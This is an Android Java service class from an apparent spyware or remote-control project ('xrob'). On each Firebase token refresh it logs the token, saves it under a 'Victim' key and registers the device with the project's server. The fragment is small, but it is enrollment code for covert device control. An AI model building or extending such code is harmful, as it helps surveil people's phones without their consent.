package com.theah64.xrob.services.firebase;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import com.google.firebase.iid.FirebaseInstanceId;
import com.google.firebase.iid.FirebaseInstanceIdService;
import com.theah64.xrob.interfaces.JobListener;
import com.theah64.xrob.models.Victim;
import com.theah64.xrob.utils.PrefUtils;

public class InstanceIdService extends FirebaseInstanceIdService {

    private static final String X = InstanceIdService.class.getSimpleName();

    @Override
    public void onTokenRefresh() {

        final String refreshedToken = FirebaseInstanceId.getInstance().getToken();
        Log.i(X, "Firebase token refreshed : " + refreshedToken);
        PrefUtils.getInstance(this).getEditor().putString(Victim.KEY_FCM_ID, refreshedToken).commit();
        Victim.register(this, null);
    }
}
